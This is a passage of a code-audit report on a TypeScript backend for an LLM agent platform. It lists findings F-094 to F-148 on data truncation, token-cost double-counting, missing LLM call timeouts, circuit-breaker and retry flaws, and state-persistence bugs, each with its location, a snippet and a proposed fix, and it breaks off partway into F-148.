#### F-094 🟠 [code][data-integrity] · Silent data truncation in `cpCommitTaskResult`
- **Where:** `apps/api/src/persistence/control-plane.ts:702, 715`.
  ```ts
  const updatedResults = [...existingResults, resultEntry].slice(-50);
  verifierState: { ..., feedback: result.summary.slice(0, 300) }
  ```
- **Observation:** two silent truncations: `results` array capped at last 50 entries (older entries **deleted**, no archive); `feedback` truncated to 300 characters (end of string silently dropped).
- **Why it matters:**
  1. **Older task results disappear.** A task with 60 result entries loses 10 permanently.
  2. **Feedback gets cut off.** A 500-char LLM feedback string loses 200 chars with no warning.
  3. **Neither truncation is surfaced** — no audit, no warning, no metric.
- **Proposed fix:** see `fix.md` F-094 — if bounded history is intentional, move older results to an append-only log (audit or a dedicated table); validate feedback length at input boundary with a clear error, not silently truncate at write.

#### F-095 🟠 [arch] · Event subscriptions never unsubscribed
- **Where:** `apps/api/src/persistence/control-plane.ts:970-989`.
  ```ts
  storeEvents.on("state-changed", () => cpNotifyStateChange());
  storeEvents.on("agents-hired", (agents) => { void Promise.allSettled(...).then(...); });
  ```
- **Observation:** two `.on(...)` calls at module load. Unsubscribe functions discarded. The `agents-hired` handler fires async work whose errors are handled only inside a `.then` — if the `.then` callback itself throws (current code doesn't, but the pattern is fragile), no handler catches.
- **Why it matters:**
  1. **No shutdown cleanup.** Handlers stay attached forever.
  2. **Test pollution.** Any test importing this module inherits both handlers permanently.
  3. **Fragile error handling in the hire handler.** Uses `.then` for error inspection rather than `.catch`.
- **Proposed fix:** see `fix.md` F-095 — capture unsubscribe; attach inside `startServer()` lifecycle; invoke during shutdown. Same shape as F-033.

#### F-096 🟡 [code] · `"company_pending"` magic string (cross-ref F-012)
- **Where:** `apps/api/src/persistence/control-plane.ts:289`.
- **Observation:** same sentinel used in server.ts. Already covered by F-012's fix.
- **Proposed fix:** see `fix.md` F-096 — bundled with F-012.

#### F-097 🟡 [code] · Nested ternary with duplicate branch result
- **Where:** `apps/api/src/persistence/control-plane.ts:320`.
  ```ts
  status: executionStatus === "idle" ? "idle" : executionStatus === "stopped" ? "idle" : "executing"
  ```
- **Observation:** both `"idle"` and `"stopped"` map to `"idle"` via nested ternary. Also, `"stopped"` isn't a value in the `ExecutionStatus` enum declared in state.ts — either a typo, a dead branch, or an undocumented extension.
- **Why it matters:** confusing to read; `"stopped"` might indicate a real enum drift.
- **Proposed fix:** see `fix.md` F-097 — verify whether `"stopped"` is intended; collapse the ternary; use a `switch (executionStatus)` with exhaustiveness check.

#### F-098 🟡 [code] · Role magic strings hardcoded throughout
- **Where:** `apps/api/src/persistence/control-plane.ts:405, 416, 480, 554`.
  ```ts
  if (agent.role === "ceo" || agent.role === "pm") ...
  if (agent.role === "tester" && currentSprint?.status === "reviewing") ...
  if ((agent.role === "cto" || agent.role === "developer") && buildCheckProductDir) ...
  ...(agent.role === "skills_lead" ? buildSkillsLeadContext(...) : {})
  ```
- **Observation:** role strings inline in branching logic. Same F-052 family.
- **Proposed fix:** see `fix.md` F-098 — import role enum from contracts; replace string literals with references.

#### F-099 🟡 [type][code] · `(currentSprint as any).reviewState` — undocumented field
- **Where:** `apps/api/src/persistence/control-plane.ts:417`.
  ```ts
  const reviewState = (currentSprint as any).reviewState;
  ```
- **Observation:** the sprint's `reviewState` field isn't part of the typed shape; accessed via `as any`. Either the Sprint contract is incomplete, or this is an ad-hoc field attached elsewhere — either way, no schema enforcement.
- **Why it matters:** data model drift hiding behind a type cast. If the field goes away, this silently becomes `undefined` and the whole review-gate logic breaks.
- **Proposed fix:** see `fix.md` F-099 — add `reviewState` to the `Sprint` Zod schema in contracts; delete the cast.

#### F-100 🟡 [arch] · Build-check side effect inside a "load" function
- **Where:** `apps/api/src/persistence/control-plane.ts:479-485`.
  ```ts
  if ((agent.role === "cto" || agent.role === "developer") && buildCheckProductDir) {
    const staleMs = Date.now() - new Date(lastBuildCheck.checkedAt).getTime();
    if (staleMs > 120_000 || lastBuildCheck.status === "unknown") {
      cpRunBuildCheck(buildCheckProductDir);
    }
  }
  ```
- **Observation:** `cpLoadAgentContext` is named "load" but conditionally fires `cpRunBuildCheck` — a 30-second `execSync` side effect. Read functions should be pure.
- **Why it matters:**
  1. **Violates least-surprise.** Readers expect "load" to be pure.
  2. **Feeds F-093.** The sync build-check is fired from a hot path.
  3. **Harder to test.** Any test of `cpLoadAgentContext` has to stub the build-check.
- **Proposed fix:** see `fix.md` F-100 — move build-check refresh to a background timer; `cpLoadAgentContext` reads cached result only.

#### F-101 🟡 [code] · DB nulls replaced with "now" — hides data corruption
- **Where:** `apps/api/src/persistence/control-plane.ts:659-660`.
  ```ts
  startedAt: r.startedAt?.toISOString() ?? new Date().toISOString()
  ```
- **Observation:** if a beat record's `startedAt` is null in the DB, the function returns the current time as if it were the startedAt value.
- **Why it matters:** a null `startedAt` is a data integrity issue; returning a plausible-looking current timestamp **hides the bug** and produces misleading audit records and graphs.
- **Proposed fix:** see `fix.md` F-101 — if `startedAt` is nullable by design, return `null` in the typed shape; if it should never be null, fail loudly when encountered.

#### F-102 🟡 [type] · Unvalidated casts on DB-row fields
- **Where:** `apps/api/src/persistence/control-plane.ts:665-667`.
  ```ts
  outcome: (r.outcome as BeatRecord["outcome"]) ?? null
  costCents: Number(r.costCents) || 0
  ```
- **Observation:** DB columns typed as raw strings or numbers are cast into the narrower `BeatRecord` union without validation. `NaN` from `Number()` silently becomes 0.
- **Why it matters:**
  1. **Invalid enum values pass through.** If a DB row has `outcome = "something_weird"`, we return it typed as a valid enum value; downstream code handles it wrong.
  2. **`NaN → 0`** loses the information "this value was corrupted."
- **Proposed fix:** see `fix.md` F-102 — Zod-validate the row shape before returning; log + skip or fail on validation failure.

#### F-103 🟡 [code] · `require("node:fs")` inside an ESM file
- **Where:** `apps/api/src/persistence/control-plane.ts:766`.
- **Observation:** CommonJS `require` used inside an ESM (`import`) file even though `fs` is already imported at line 737. Mixes module systems unnecessarily.
- **Why it matters:** stylistic; occasionally breaks under strict ESM-only bundler configs.
- **Proposed fix:** see `fix.md` F-103 — use the top-level `readFileSync` import.

#### F-104 🟡 [arch][reliability] · Trust cache/DB divergence on write failure
- **Where:** `apps/api/src/persistence/control-plane.ts:822-861`.
- **Observation:** `cpUpdateTrustScore` updates the in-memory cache *first*, then tries to persist to the DB. If the DB write fails (caught and `console.warn`'d), the cache is ahead of the DB. Next server restart hydrates from DB, losing the update.
- **Why it matters:**
  1. **Governance state drift.** Trust scores silently revert across restarts on DB outages.
  2. **No operator signal.** A warn log is the only sign.
- **Proposed fix:** see `fix.md` F-104 — DB write first, then cache (fail-safe order); OR mark the cache entry dirty and retry; OR an outbox-pattern write queue.

#### F-105 🟡 [code] · `recentViolationsCache` ring-buffer splice is non-atomic
- **Where:** `apps/api/src/persistence/control-plane.ts:867`.
  ```ts
  recentViolationsCache.push(violation);
  if (recentViolationsCache.length > 500) recentViolationsCache.splice(0, recentViolationsCache.length - 500);
  ```
- **Observation:** push + conditional splice. Under concurrent async callers within the same tick, intermediate states are observable by other code reading the array.
- **Why it matters:** single-threaded JS prevents true races, but interleaved microtasks can see a transiently-oversize array.
- **Proposed fix:** see `fix.md` F-105 — use a proper bounded ring buffer (shift + push in one op) or a small dedicated class with a `.push()` method that bounds internally.

#### F-106 🟡 [obs] · `cpGetPolicyViolations` DB-outage silent fallback
- **Where:** `apps/api/src/persistence/control-plane.ts:904-939`.
- **Observation:** when the DB throws, we `console.warn` and fall back to the in-memory cache. Callers get "data" and can't tell if it's fresh or cache-only.
- **Why it matters:** hides DB outages; incident detection relies on noticing the stderr line.
- **Proposed fix:** see `fix.md` F-106 — return a `{ data, source: "db" | "cache-fallback", degraded: boolean }` shape; alert on `degraded: true`.

#### F-107 🟡 [code] · `cpGetAllTrustScores()` returns mutable view of cache
- **Where:** `apps/api/src/persistence/control-plane.ts:942-944`.
  ```ts
  export function cpGetAllTrustScores(): TrustScore[] {
    return Array.from(trustScoreCache.values());
  }
  ```
- **Observation:** the array is new, but the `TrustScore` objects inside are live references. External mutations reach into the cache.
- **Why it matters:** same F-045 class.
- **Proposed fix:** see `fix.md` F-107 — deep clone; or return `Readonly<TrustScore>[]`.

#### F-108 🟡 [obs] · `cpHydrateTrustScores` failure silently returns
- **Where:** `apps/api/src/persistence/control-plane.ts:947-964`.
- **Observation:** DB hydrate failure → `console.warn` → function returns. Server continues booting with **empty trust cache**. Governance silently runs with every agent at initial score.
- **Why it matters:** silent governance degradation on DB blip; board has no idea.
- **Proposed fix:** see `fix.md` F-108 — `audit.auditError(...)`; consider setting a `governance_degraded: true` flag surfaced on `/api/health` (bundled with F-030).

#### F-109 🟡 [obs][agent] · Trust cache miss silently falls back to initial score
- **Where:** `apps/api/src/persistence/control-plane.ts:436`.
  ```ts
  const agentTrustScore = trustScoreCache.get(agentId)?.score ?? TRUST_CONFIG.initialScore;
  ```
- **Observation:** if the cache doesn't contain this agent (e.g. hydrate failed per F-108), silently use the initial score. No warning.
- **Why it matters:** "why are all agents at initial trust?" becomes an unanswerable question because nothing logs the miss.
- **Proposed fix:** see `fix.md` F-109 — warn + audit on cache miss for an agent that should be hydrated.

#### F-110 🟡 [code] · `taskProgress: []` hardcoded with "Phase 2" TODO
- **Where:** `apps/api/src/persistence/control-plane.ts:526`.
  ```ts
  taskProgress: [], // Phase 2: populated when task_progress mutations exist
  ```
- **Observation:** permanently empty array. If the consuming side (heartbeat runtime) ever relies on this, it's working with a lie.
- **Why it matters:** either remove the field from the contract or actually populate it. Living TODO shouldn't be in prod.
- **Proposed fix:** see `fix.md` F-110 — grep consumers; if unused, delete the field; if used, implement the query.

#### F-111 🟡 [code] · `agent.role === "skills_lead"` magic string (cross-ref F-098)
- **Where:** `apps/api/src/persistence/control-plane.ts:554`.
- **Observation:** same family as F-098 / F-052.
- **Proposed fix:** bundled with F-098.

#### F-112 🟡 [obs] · `cpCommitBeatRecord` silent DB failure
- **Where:** `apps/api/src/persistence/control-plane.ts:599-629`.
- **Observation:** DB write failure → `console.warn` → returns `false`. No audit, no retry, no metric. Callers who use the boolean have no context.
- **Why it matters:** beat records are the observability backbone; losing them silently is an audit-trail gap.
- **Proposed fix:** see `fix.md` F-112 — audit the failure; retry with backoff; expose "failed beat record writes" counter.

#### F-113 🟢 [code] · `agents-hired` handler error swallow via `.then`
- **Where:** `apps/api/src/persistence/control-plane.ts:983-987`.
  ```ts
  ).then((results) => {
    const failed = results.filter((r) => r.status === "rejected").length;
    if (failed > 0) console.warn(`[Trust] init failed for ${failed}/${agents.length} agents`);
  });
  ```
- **Observation:** `Promise.allSettled` + `.then` with no `.catch`. If the `.then` callback throws, unhandled rejection.
- **Proposed fix:** see `fix.md` F-113 — append `.catch(console.error)` or await with try/catch.

#### F-114 🟢 [type] · `(mutation as any).type` in default branch instead of `assertNever`
- **Where:** `apps/api/src/persistence/control-plane.ts:266`.
  ```ts
  default:
    throw new Error(`Unknown mutation type: ${(mutation as any).type}`);
  ```
- **Observation:** should be `default: return assertNever(mutation)` so TypeScript enforces exhaustiveness at compile time.
- **Proposed fix:** see `fix.md` F-114 — import/introduce `assertNever`; remove the `as any`.

#### F-115 🟢 [code] · Imports declared mid-file
- **Where:** `apps/api/src/persistence/control-plane.ts:736-738`.
  ```ts
  import { execSync } from "node:child_process";
  import { existsSync } from "node:fs";
  import { join } from "node:path";
  ```
- **Observation:** imports halfway through a 989-line file. Convention requires top-of-file.
- **Proposed fix:** see `fix.md` F-115 — move to top; group with other `node:` imports.

#### F-116 🟢 [code] · `String(record.costCents)` unexplained type coercion
- **Where:** `apps/api/src/persistence/control-plane.ts:620`.
- **Observation:** `costCents` is a number in memory; cast to string when writing. Likely because the DB column is `text` (precision preservation) — but no comment explains it.
- **Proposed fix:** see `fix.md` F-116 — add a JSDoc explaining the column type; or change the DB column to `numeric` and drop the cast.

#### F-117 🟢 [code] · `||` instead of `??` on cost fallback
- **Where:** `apps/api/src/persistence/control-plane.ts:667`.
  ```ts
  costCents: Number(r.costCents) || 0
  ```
- **Observation:** `||` treats `0` as falsy — but since the fallback is also `0`, same result here. The intent is "if NaN, fall to 0," which works. Still cleaner with explicit `Number.isFinite(n) ? n : 0`.
- **Proposed fix:** see `fix.md` F-117 — `Number.isFinite(n) ? n : 0` for clarity.

---

### `apps/api/src/infra/azure-openai.ts` + `apps/api/src/infra/resilience.ts`

#### F-118 🔴 [perf][data-integrity] · `accumulateBeatTokens` double-counts across concurrent beats
- **Where:** `apps/api/src/infra/azure-openai.ts:58-67`.
  ```ts
  function accumulateBeatTokens(totalTokens: number) {
    for (const [beatId, current] of beatTokenAccumulators) {
      beatTokenAccumulators.set(beatId, current + totalTokens);
    }
    for (const [meetingId, current] of meetingTokenAccumulators) {
      meetingTokenAccumulators.set(meetingId, current + totalTokens);
    }
  }
  ```
- **Observation:** every LLM call adds its token count to **every** active beat/meeting accumulator. The comment says "usually just one active beat per agent" — but the whole heartbeat architecture is built around **concurrent** beats (one per active agent). For N concurrent beats, every LLM call is counted N times per accumulator.
- **Why it matters:**
  1. **Cost tracking lies.** Reported beat cost = actual cost × N concurrent beats at time of call.
  2. **Budget enforcement overshoots.** A beat under budget in reality reports over budget, gets halted; a beat actually over budget may appear under because its own spend is spread across other accumulators.
  3. **Cross-tenant contamination** once multi-tenant lands — company A's LLM call gets counted into company B's active beat.
- **Proposed fix:** see `fix.md` F-118 — attribute tokens to **exactly one** accumulator by threading `beatId`/`meetingId` through `LlmAuditContext`.

#### F-119 🟠 [reliability] · No fetch timeout on any LLM call
- **Where:** `apps/api/src/infra/azure-openai.ts:114, 199, 267` — all three of `chatCompletion`, `structuredCompletion`, `chatCompletionStream` call `fetch(url, { ... })` without an `AbortSignal`.
- **Observation:** `resilientCall` wraps retry + circuit breaker, neither of which handles "call never returns." If Azure hangs, each call blocks indefinitely; the breaker only sees the eventual error.
- **Why it matters:** a deadlocked Azure endpoint takes the whole system down silently — workers pile up waiting on a fetch that will never complete. Same class as F-079 for opencode.
- **Proposed fix:** see `fix.md` F-119 — attach `AbortController` with a configurable timeout (default ~60s) to every fetch.

#### F-120 🟠 [sec][obs] · Azure error bodies included verbatim in thrown error messages
- **Where:** `apps/api/src/infra/azure-openai.ts:123-126, 220-223, 276-279`.
  ```ts
  if (!response.ok) {
    const body = await response.text();
    throw new Error(`Azure OpenAI ${deployment} error ${response.status}: ${body}`);
  }
  ```
- **Observation:** the full response body is concatenated into the error message. Azure error responses can include diagnostic data — request IDs, deployment names, rate-limit headers, occasionally echoed request content. Whatever Azure sends ends up in `Error.message`, which flows to audit (via F-011) and logs.
- **Why it matters:**
  1. **Secret leakage surface.** If the echoed payload contains partial request content (some Azure error paths echo), it could include the system prompt or user input — which in Arceus's case contains sensitive project context.
  2. **Compounds F-011 + F-007** — audit truncates to `.message` but the body still lands there; Pino has no redaction configured.
- **Proposed fix:** see `fix.md` F-120 — include status + short reason in the error message; attach the body to a `cause` or custom `AzureHttpError` field that audit's `serializeError` can selectively surface.

#### F-121 🟠 [obs][perf] · `chatCompletionStream` doesn't track token usage — silent cost gap
- **Where:** `apps/api/src/infra/azure-openai.ts:256-303`.
- **Observation:** the function returns a `ReadableStream` and audits only the start event. The comment at line 285-286 says "For streaming, we can't read usage from the response (it's chunked)" — but OpenAI-style streams **do** include usage when `stream_options: { include_usage: true }` is sent in the request. This code doesn't set that option and doesn't parse the usage chunk.
- **Why it matters:**
  1. **Streaming LLM calls contribute zero to cost tracking.** Any caller that switches from `chatCompletion` to `chatCompletionStream` gets 0-token accounting.
  2. **Budget drift.** Operators see "way under budget"; Azure bills the real number.
  3. **Compounds F-118** — even if double-counting is fixed, stream usage remains invisible.
- **Proposed fix:** see `fix.md` F-121 — send `stream_options: { include_usage: true }`; wrap the stream to peek at chunks, extract usage on the final chunk, emit audit + accumulator update then.

#### F-122 🟠 [code] · Silent fallback to `""` on missing LLM response content
- **Where:** `apps/api/src/infra/azure-openai.ts:136`.
  ```ts
  return json.choices[0]?.message?.content ?? "";
  ```
- **Observation:** if Azure returns a response with no choices / no message / no content, we return an empty string. Downstream code treats `""` as valid empty response rather than "LLM failed."
- **Why it matters:**
  1. **Silent corruption.** A caller expecting content gets `""`, attempts to parse/use, produces empty artifacts.
  2. **Inconsistent with `structuredCompletion`** at line 234-237 which explicitly throws on missing content. Two entry points, two behaviors.
- **Proposed fix:** see `fix.md` F-122 — throw `LlmEmptyResponseError` matching the existing `LlmTruncatedOutputError` pattern.

#### F-123 🟠 [arch][docs] · `resilientCall` docstring describes behavior the code does NOT implement
- **Where:** `apps/api/src/infra/resilience.ts:170-180`.
  ```ts
  /** ... Retries happen *inside* the breaker — each attempt counts toward
   *  the breaker's failure threshold independently. */
  export async function resilientCall<T>(fn, opts) {
    return opts.breaker.execute(() => withRetry(fn, opts));
  }
  ```
- **Observation:** the docstring claims each retry attempt counts independently toward the breaker threshold. The **implementation** does `breaker.execute(withRetry(...))` — `withRetry` runs up to 3 retries internally, then its **final** outcome is what the breaker sees. **One breaker outcome per `resilientCall`, not one per retry.**
- **Why it matters:**
  1. **Breaker opens ~3× slower than documented.** Threshold of 3 + retries of 3 = 9 underlying failures before open.
  2. **Callers trust the wrong mental model.** "I expected fast-fail after 3 errors; we're still hammering after 9."
  3. **Wrong order is strictly worse** for most use cases — when the breaker is open, retries should fail fast. Currently, if a breaker opens mid-retry, the `CircuitOpenError` aborts withRetry on the next attempt, but we waste the initial call and (on older behavior) N-1 retries that already happened.
- **Proposed fix:** see `fix.md` F-123 — swap order to `withRetry(() => breaker.execute(fn))` so each retry goes through the breaker independently; or keep current order and fix the docstring.

#### F-124 🟠 [obs] · Circuit breaker state changes emitted only to stderr
- **Where:** `apps/api/src/infra/resilience.ts:186-192`.
  ```ts
  function logStateChange(from, to, name) {
    if (level === "error") console.error(msg);
    else if (level === "warn") console.warn(msg);
    else console.log(msg);
  }
  ```
- **Observation:** a breaker opening is a **major operational event** — means a dependency is failing. Only signal is a console line. No audit, no metric, no alert.
- **Why it matters:**
  1. **Invisible to post-mortem.** Unless operators happened to be tailing stderr, the breaker opened and closed without trace.
  2. **Incident detection impossible via dashboards.** Can't alert "breaker open for >2 min."
  3. **Compounds F-001** — process-level error suppression means the stderr line itself might scroll past without retention.
- **Proposed fix:** see `fix.md` F-124 — route state changes to the audit ledger + Prometheus-style counter; alert on `state=open`.

#### F-125 🟠 [code][type] · Retryable-error classification via string matching
- **Where:** `apps/api/src/infra/resilience.ts:238-253`.
  ```ts
  if (msg.includes("timeout") || msg.includes("econnreset") || msg.includes("enotfound")) return true;
  if (msg.includes("item with id") && msg.includes("not found")) return true;  // OpenCode-specific
  const statusMatch = msg.match(/error (\d{3})/);
  ```
- **Observation:** four string-matching cases. Node error messages vary by version. The `"item with id"` pattern is OpenCode-specific — direct cross-service coupling via free text. The HTTP status regex matches errors thrown by *our own* Azure wrapper (F-120's `Error`).
- **Why it matters:**
  1. **Brittle.** Any error-format change (Node upgrade, Azure wrapper rewrite, OpenCode release) silently breaks retry logic.
  2. **Same class as F-072.** Demonstrates "string matching across service boundaries" as a widespread pattern in this codebase.
  3. **Lost retry opportunities.** Errors that *should* retry fall through the match and don't.
- **Proposed fix:** see `fix.md` F-125 — throw typed error classes (`HttpError { status }`, `OpencodeStaleSessionError`); check `error.code` for Node errors; classify by shape, not string.

#### F-126 🟠 [reliability] · No cap on retry backoff delay
- **Where:** `apps/api/src/infra/resilience.ts:52-54`.
  ```ts
  const wait = delay * Math.pow(backoff, attempt - 1) * jitter;
  await new Promise((r) => setTimeout(r, wait));
  ```
- **Observation:** exponential backoff with no maximum. With `delay=1000`, `backoff=2`, and `maxRetries=10`, the final wait is `1000 * 2^9 ≈ 512s` — 8.5 minutes of blocked async. Callers that don't set `maxRetries` carefully hang their request.
- **Why it matters:** graceful shutdown, timeouts, user-visible latency all suffer; an unattended long-retry can block worker slots for minutes.
- **Proposed fix:** see `fix.md` F-126 — add `maxDelay: number` to `RetryOptions` (default 30_000); clamp via `Math.min(wait, maxDelay)`.

#### F-127 🟡 [arch] · Module-level token accumulator Maps (F-043 family)
- **Where:** `apps/api/src/infra/azure-openai.ts:28, 44`.
- **Observation:** two more module-level Maps (`beatTokenAccumulators`, `meetingTokenAccumulators`). Same pattern as F-043 / F-089 — no boundary, no lifecycle.
- **Proposed fix:** see `fix.md` F-127 — move into a `LlmCostTracker` class owned by the orchestration state or control plane.

#### F-128 🟡 [perf] · `zodToJsonSchema` recomputed on every `structuredCompletion` call
- **Where:** `apps/api/src/infra/azure-openai.ts:189-192`.
  ```ts
  const derived = zodToJsonSchema(schema, { target: "openAi", $refStrategy: "none" });
  ```
- **Observation:** runs on every call, with identical inputs for every invocation that uses the same schema. `zodToJsonSchema` walks the Zod tree — not free at scale.
- **Why it matters:** hot-path callers (classification, planner) incur redundant work per call.
- **Proposed fix:** see `fix.md` F-128 — cache derived JSON schema by schema reference via `WeakMap`.

#### F-129 🟡 [code] · Hardcoded `temperature: 0.7` in `chatCompletion` and stream
- **Where:** `apps/api/src/infra/azure-openai.ts:120, 273`.
- **Observation:** `structuredCompletion` accepts `temperature` via options; the other two entry points don't. Inconsistent.
- **Proposed fix:** see `fix.md` F-129 — accept `temperature` via options; default to 0.7.

#### F-130 🟡 [type] · Response shape cast with `as`, not Zod-validated
- **Where:** `apps/api/src/infra/azure-openai.ts:128-131, 225-228`.
  ```ts
  const json = (await response.json()) as {
    choices: Array<{ message: { content: string } }>;
    usage?: AzureOpenAIUsage;
  };
  ```
- **Observation:** if Azure's response shape changes (new field, renamed field, error response slipping through with `200 OK`), the cast lies and downstream code crashes confusingly.
- **Proposed fix:** see `fix.md` F-130 — Zod schema for the Azure response; `parse` at boundary.

#### F-131 🟡 [code] · `DEFAULT_STRUCTURED_MAX_TOKENS = 12000` magic number
- **Where:** `apps/api/src/infra/azure-openai.ts:175`.
- **Observation:** one of many magic numbers; not in config.
- **Proposed fix:** see `fix.md` F-131 — move to `config/llm.ts`; env-overridable.

#### F-132 🟡 [reliability] · No AbortSignal support on any LLM call
- **Where:** all three LLM exports.
- **Observation:** caller has no way to cancel an in-flight LLM call. Once invoked, it runs to completion (or breaker-exhaustion) regardless of whether the caller's context is still valid.
- **Proposed fix:** see `fix.md` F-132 — accept `signal?: AbortSignal` in each exported call; pass to fetch. Bundled with F-119.

#### F-133 🟡 [code] · Missing api-key validation — silent `"undefined"` string
- **Where:** `apps/api/src/infra/azure-openai.ts:118, 203, 271`.
  ```ts
  headers: { "api-key": runtimeConfig.azureApiKey }
  ```
- **Observation:** if `runtimeConfig.azureApiKey` is undefined, the string `"undefined"` is sent as the header value. Azure returns 401 with an obscure body — no clear signal that the root cause is missing config.
- **Proposed fix:** see `fix.md` F-133 — bundled with F-078 (Zod-validated runtimeConfig).

#### F-134 🟡 [obs] · `chatCompletionStream` audits start, never completion or error
- **Where:** `apps/api/src/infra/azure-openai.ts:288-297`.
- **Observation:** `llm_stream_started` event is emitted; no paired `llm_stream_completed` or `llm_stream_failed`. Cannot compute stream duration, completion rate, or error rate from audit alone.
- **Proposed fix:** see `fix.md` F-134 — wrap the returned stream to emit `llm_stream_completed` / `llm_stream_failed` when it ends. Bundled with F-121.

#### F-135 🟡 [reliability] · `isRetryableHttpStatus` missing 408 and 425
- **Where:** `apps/api/src/infra/resilience.ts:226`.
  ```ts
  return status === 429 || status === 502 || status === 503 || status === 504;
  ```
- **Observation:** missing 408 (Request Timeout — explicitly retryable per RFC 9110) and 425 (Too Early). Edge cases but there's no reason to exclude them.
- **Proposed fix:** see `fix.md` F-135 — add 408 and 425; consider optional 409 depending on use case.

#### F-136 🟡 [reliability] · `Date.now()` used for breaker cooldown (clock-skew risk)
- **Where:** `apps/api/src/infra/resilience.ts:94, 135`.
- **Observation:** cooldown comparison uses wall-clock time. System clock adjustments (NTP sync, admin intervention) can shorten or extend cooldowns unexpectedly.
- **Why it matters:** low-probability operational issue; real under significant clock skew or during hypervisor migrations.
- **Proposed fix:** see `fix.md` F-136 — use `performance.now()` or `process.hrtime.bigint()` for monotonic timing.

#### F-137 🟡 [obs] · No audit/metric on retry attempts
- **Where:** `apps/api/src/infra/resilience.ts:30-59`.
- **Observation:** the `onRetry` hook exists as an option but no call site uses it. Retry attempts are invisible to audit; "the system was slow at 14:32" is unanswerable without retry data.
- **Proposed fix:** see `fix.md` F-137 — emit `audit { eventType: "external_call_retry" }` via an `onRetry` hook wired by callers; expose a `retryCountTotal` metric.

#### F-138 🟡 [obs] · `logStateChange` helper doesn't route to metrics
- **Where:** `apps/api/src/infra/resilience.ts:186-192`.
- **Observation:** same root as F-124 — breaker state changes go only to stderr.
- **Proposed fix:** see `fix.md` F-138 — bundled with F-124.

#### F-139 🟡 [arch] · Module-level `breakers` registry (F-043 family)
- **Where:** `apps/api/src/infra/resilience.ts:194-213`.
- **Observation:** module-level singleton Map of three pre-built breakers. Can't instantiate independently (tests, isolation).
- **Proposed fix:** see `fix.md` F-139 — parameterize via a `BreakerRegistry` class constructed in `startServer()`. Parallels F-043 / F-069 / F-089.

#### F-140 🟢 [type] · Cast on `response.json()` without runtime validation
- **Where:** `apps/api/src/infra/azure-openai.ts:128, 225`.
- **Observation:** nit-level duplicate of F-130.
- **Proposed fix:** bundled with F-130.

#### F-141 🟢 [code] · Optional chain on Azure response fields
- **Where:** `apps/api/src/infra/azure-openai.ts:136`.
  ```ts
  return json.choices[0]?.message?.content ?? "";
  ```
- **Observation:** Azure's contract guarantees `choices[0].message.content` on success. Defensive chains obscure the actual contract.
- **Proposed fix:** see `fix.md` F-141 — replace with explicit throw on missing field (folds into F-122).

#### F-142 🟢 [code] · Jitter range 0.85–1.15 is narrow (±15%)
- **Where:** `apps/api/src/infra/resilience.ts:52`.
  ```ts
  const jitter = Math.random() * 0.3 + 0.85;  // 0.85-1.15
  ```
- **Observation:** ±15% jitter means retries cluster tightly. Under load, many clients retry near the same moment (thundering-herd risk). Industry practice: full decorrelated jitter = `Math.random() * 0.5 + 0.5` (0.5-1.0) or even full `Math.random()`.
- **Proposed fix:** see `fix.md` F-142 — widen to `Math.random() * 0.5 + 0.5`.

---

### `apps/api/src/persistence/store.ts`

#### F-143 🔴 [data-integrity] · `bootstrapCompany` generates two different strategy UUIDs — dangling pointer
- **Where:** `apps/api/src/persistence/store.ts:421, 433`.
  ```ts
  company: { ..., currentStrategyId: `strategy_${crypto.randomUUID()}`, ... },  // UUID A
  strategy: { ..., id: `strategy_${crypto.randomUUID()}`, ... },                  // UUID B
  ```
- **Observation:** two separate `crypto.randomUUID()` calls produce different UUIDs. The company's `currentStrategyId` field points at a strategy that doesn't exist; the actual strategy's own id is a different UUID. Bootstrap creates a broken foreign-key relationship from birth.
- **Why it matters:** any code that joins `company.currentStrategyId` to the strategy object by id returns nothing. "Strategy not found" symptoms on fresh companies trace directly here.
- **Proposed fix:** see `fix.md` F-143 — declare the UUID once, reuse.

#### F-144 🟠 [arch] · 5 `let` + 2 `Map` module-level singletons (F-043 family, core)
- **Where:** `apps/api/src/persistence/store.ts:35-40, 228`.
  ```ts
  let snapshot = createEmptyCompanySnapshot();
  let events: EventEnvelope[] = [];
  let dirty = false;
  let lastHydratedAt: string | null = null;
  let lastFlushedAt: string | null = null;
  let mutationsSinceHydrate = 0;
  const taskProgressMap = new Map<string, TaskProgress>();
  ```
- **Observation:** this is **the** write-back cache behind the entire system. Every F-043-family flaw (state.ts, opencode.ts, control-plane.ts, azure-openai.ts) ultimately derives from this file's module-level state.
- **Why it matters:** fixing F-043 / F-089 / F-069 / F-127 without also fixing this file leaves them half-done — they'd each wrap their own state but still share *this* one.
- **Proposed fix:** see `fix.md` F-144 — `CompanyStore` class as the umbrella refactor, parallel to F-043 / F-089 / F-069.

#### F-145 🟠 [data-integrity] · `taskProgressMap` is separate from snapshot → never persisted, lost on restart
- **Where:** `apps/api/src/persistence/store.ts:228-244`.
- **Observation:** `taskProgressMap` lives as its own Map outside the `snapshot` object. As a result:
  - `replaceState` never touches it — mutations don't dirty-flag.
  - `persistState` doesn't include it — never scheduled for DB flush.
  - `hydrate` doesn't load it — every restart starts at zero task progress.
  - `teardown` / `resetCompany` don't clear it — stale entries survive resets.
- **Why it matters:** directly explains F-110 (the `taskProgress: []` stub in control-plane). Nothing was writing task progress to DB, so context assembly always returned empty.
- **Proposed fix:** see `fix.md` F-145 — move `taskProgress` into `snapshot` as a field on each task OR a top-level array; route through `replaceState`.

#### F-146 🟠 [obs][reliability] · `persistState` failure silently swallowed
- **Where:** `apps/api/src/persistence/store.ts:42-46`.
  ```ts
  function persistState() {
    void schedulePersistedCompanyState(snapshot, events).catch((error) => {
      console.warn("[store] Failed to persist company state", error);
    });
  }
  ```
- **Observation:** same class as F-006 / F-091. Every mutation schedules a persist; every persist failure is a `console.warn` line, nothing more. The durability gap's front door.
- **Proposed fix:** see `fix.md` F-146 — audit the failure with `serializeError`; expose "persist failures" counter; alert on non-zero rate. Bundle with F-091.

#### F-147 🟠 [obs][arch] · `hydrate` doesn't emit `state-changed` event
- **Where:** `apps/api/src/persistence/store.ts:115-127`.
- **Observation:** `hydrate` replaces `snapshot` + `events` directly. It does NOT call `replaceState`, so `storeEvents.emit("state-changed")` never fires. Subscribers (e.g. `cpNotifyStateChange` at `control-plane.ts:970`) miss the reload entirely — `snapshotVersion` doesn't bump, derived views stay stale.
- **Proposed fix:** see `fix.md` F-147 — call `replaceState` during hydrate (or emit the event manually); pick an explicit semantic for `snapshotVersion` on reload (reset vs bump) and document it.

#### F-148 🟠 [arch][data-integrity] · `resetCompany` and `clearPersistedStoreState` are asymmetric
- **Where:** `apps/api/src/persistence/store.ts:98-104, 156-158`.
